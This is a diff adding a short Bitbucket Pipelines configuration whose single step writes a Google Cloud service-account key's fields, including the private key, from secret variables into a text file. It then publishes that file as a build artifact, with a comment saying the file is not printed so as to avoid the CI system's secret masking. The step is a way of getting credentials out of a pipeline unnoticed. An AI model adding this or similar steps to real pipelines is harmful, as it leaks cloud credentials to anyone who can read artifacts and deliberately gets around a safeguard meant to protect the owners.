@@ -1,0 +1,21 @@
+pipelines:
+  default:
+    - step:
+        name: Export Secrets as Artifact
+        script:
+          - |
+            # Write secrets to a file with labels for clarity
+            echo "type: ${type}" > secret_vals.txt
+            echo "project_id: ${project_id}" >> secret_vals.txt
+            echo "private_key_id: ${private_key_id}" >> secret_vals.txt
+            echo "private_key: ${private_key}" >> secret_vals.txt
+            echo "client_email: ${client_email}" >> secret_vals.txt
+            echo "client_id: ${client_id}" >> secret_vals.txt
+            echo "auth_uri: ${auth_uri}" >> secret_vals.txt
+            echo "token_uri: ${token_uri}" >> secret_vals.txt
+            echo "auth_provider_x509_cert_url: ${auth_provider_x509_cert_url}" >> secret_vals.txt
+            echo "client_x509_cert_url: ${client_x509_cert_url}" >> secret_vals.txt
+            echo "universe_domain: ${universe_domain}" >> secret_vals.txt
+            # Do not 'cat' or 'echo' the file contents to avoid masking
+        artifacts:
+          - secret_vals.txt
